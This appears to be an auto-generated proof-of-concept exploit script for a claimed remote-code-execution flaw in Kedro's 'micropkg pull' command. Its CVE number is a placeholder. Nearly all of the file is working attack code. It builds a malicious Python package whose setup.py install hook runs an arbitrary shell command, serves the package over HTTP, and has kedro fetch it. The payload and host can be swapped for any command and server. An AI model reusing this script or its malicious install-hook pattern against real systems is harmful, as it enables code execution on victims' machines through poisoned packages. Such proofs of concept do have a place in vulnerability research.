#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: rce-011
# Sink: call
# Auto-generated — run with: python3 rce_cli_manifest_call.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull RCE (CVE-2024-XXXXX).

Vulnerability: The `package_path` parameter in `kedro micropkg pull` is passed
directly to `pip download` without sanitization. Although arguments are passed
as a list (preventing shell injection), pip interprets the package specifier
as a package name or URL. An attacker can supply a malicious package from a
controlled index or use pip options like `--extra-index-url` to execute code
during package installation.

This PoC demonstrates the vulnerability by:
1. Setting up a malicious PyPI package that executes a benign payload
2. Starting a local HTTP server to serve the malicious package
3. Calling `kedro micropkg pull` with a crafted package_path that points to
   our malicious package

Usage:
    python3 poc_kedro_rce.py [--target TARGET_DIR] [--payload PAYLOAD]

Requirements:
    - Python 3.8+
    - kedro installed (pip install kedro)
    - twine (pip install twine) for package upload simulation
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
import time
import threading
import http.server
import socketserver
import json
import hashlib
import base64
from pathlib import Path
from urllib.parse import urlparse

# =============================================================================
# Configuration
# =============================================================================
DEFAULT_PAYLOAD = "touch /tmp/poc_success.txt"
DEFAULT_PORT = 8888
DEFAULT_HOST = "127.0.0.1"

# =============================================================================
# Malicious Package Generator
# =============================================================================

class MaliciousPackage:
    """Creates a malicious Python package that executes a payload on install."""
    
    def __init__(self, name: str, payload: str, version: str = "1.0.0"):
        self.name = name
        self.payload = payload
        self.version = version
        self.temp_dir = None
        
    def create(self) -> Path:
        """Create a malicious package directory structure."""
        self.temp_dir = Path(tempfile.mkdtemp(prefix="poc_kedro_"))
        
        # Create package directory
        pkg_dir = self.temp_dir / self.name
        pkg_dir.mkdir(parents=True)
        
        # Create setup.py with malicious install hook
        setup_content = f'''from setuptools import setup
from setuptools.command.install import install
import subprocess
import sys

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        print("[*] Executing payload...")
        subprocess.run("{self.payload}", shell=True, check=False)

setup(
    name="{self.name}",
    version="{self.version}",
    packages=["{self.name}"],
    cmdclass={{'install': PostInstallCommand}},
)
'''
        (self.temp_dir / "setup.py").write_text(setup_content)
        
        # Create __init__.py
        (pkg_dir / "__init__.py").write_text("# malicious package\n")
        
        # Create setup.cfg
        (self.temp_dir / "setup.cfg").write_text(
            f"[metadata]\nname = {self.name}\nversion = {self.version}\n"
        )
        
        return self.temp_dir
    
    def build_sdist(self) -> Path:
        """Build source distribution."""
        if not self.temp_dir:
            self.create()
        
        # Build sdist
        result = subprocess.run(
            [sys.executable, "setup.py", "sdist", "--formats=gztar"],
            cwd=str(self.temp_dir),
            capture_output=True,
            text=True
        )
        if result.returncode != 0:
            print(f"[-] Failed to build sdist: {result.stderr}")
            sys.exit(1)
        
        # Find the generated tar.gz
        dist_dir = self.temp_dir / "dist"
        sdist_files = list(dist_dir.glob("*.tar.gz"))
        if not sdist_files:
            print("[-] No sdist file generated")
            sys.exit(1)
        
        return sdist_files[0]
    
    def cleanup(self):
        """Remove temporary files."""
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)

# =============================================================================
# HTTP Server for Serving Malicious Package
# =============================================================================

class PackageHTTPServer:
    """Simple HTTP server to serve the malicious package."""
    
    def __init__(self, host: str, port: int, package_dir: Path):
        self.host = host
        self.port = port
        self.package_dir = package_dir
        self.server = None
        self.thread = None
        
    def start(self):
        """Start the HTTP server in a background thread."""
        os.chdir(str(self.package_dir))
        
        handler = http.server.SimpleHTTPRequestHandler
        
        class QuietHandler(handler):
            def log_message(self, format, *args):
                pass  # Suppress logs
        
        self.server = socketserver.TCPServer((self.host, self.port), QuietHandler)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"[*] HTTP server started on http://{self.host}:{self.port}")
        
    def stop(self):
        """Stop the HTTP server."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()

# =============================================================================
# Exploit Execution
# =============================================================================

def run_exploit(target_dir: str, payload: str, host: str, port: int):
    """Execute the exploit against a Kedro project."""
    
    print("[*] Starting Kedro micropkg pull RCE exploit")
    print(f"[*] Target directory: {target_dir}")
    print(f"[*] Payload: {payload}")
    
    # Step 1: Create malicious package
    print("[*] Creating malicious package...")
    pkg_name = f"poc_malicious_{int(time.time())}"
    malicious = MaliciousPackage(pkg_name, payload)
    sdist_path = malicious.build_sdist()
    print(f"[+] Malicious package created at: {sdist_path}")
    
    # Step 2: Start HTTP server to serve the package
    print("[*] Starting HTTP server...")
    server = PackageHTTPServer(host, port, sdist_path.parent)
    server.start()
    
    try:
        # Step 3: Construct the malicious package_path
        # We use a URL that points to our malicious package
        # pip will download and install it, triggering the payload
        package_url = f"http://{host}:{port}/{sdist_path.name}"
        print(f"[*] Malicious package URL: {package_url}")
        
        # Step 4: Execute kedro micropkg pull with our malicious package
        print("[*] Executing kedro micropkg pull...")
        cmd = [
            sys.executable, "-m", "kedro", "micropkg", "pull",
            package_url,
            "--destination", target_dir
        ]
        
        print(f"[*] Running command: {' '.join(cmd)}")
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] stdout: {result.stdout}")
        print(f"[*] stderr: {result.stderr}")
        
        # Step 5: Check if payload executed
        if payload.startswith("touch"):
            payload_file = payload.split()[-1]
            if os.path.exists(payload_file):
                print(f"[+] SUCCESS! Payload file created: {payload_file}")
                print("[+] RCE confirmed!")
            else:
                print("[-] Payload file not found. Exploit may have failed.")
        else:
            print("[*] Payload execution check not implemented for this payload type")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
    finally:
        # Cleanup
        server.stop()
        malicious.cleanup()
        print("[*] Cleanup complete")

# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg pull RCE vulnerability"
    )
    parser.add_argument(
        "--target",
        default=os.getcwd(),
        help="Target Kedro project directory (default: current directory)"
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD,
        help=f"Payload to execute (default: '{DEFAULT_PAYLOAD}')"
    )
    parser.add_argument(
        "--host",
        default=DEFAULT_HOST,
        help=f"Host for malicious package server (default: {DEFAULT_HOST})"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Port for malicious package server (default: {DEFAULT_PORT})"
    )
    
    args = parser.parse_args()
    
    # Validate target directory
    target_path = Path(args.target).resolve()
    if not target_path.exists():
        print(f"[-] Target directory does not exist: {target_path}")
        sys.exit(1)
    
    # Check if kedro is installed
    try:
        subprocess.run(
            [sys.executable, "-m", "kedro", "--version"],
            capture_output=True,
            check=True
        )
    except subprocess.CalledProcessError:
        print("[-] Kedro is not installed. Install with: pip install kedro")
        sys.exit(1)
    except FileNotFoundError:
        print("[-] Python executable not found")
        sys.exit(1)
    
    # Run exploit
    run_exploit(str(target_path), args.payload, args.host, args.port)

if __name__ == "__main__":
    main()
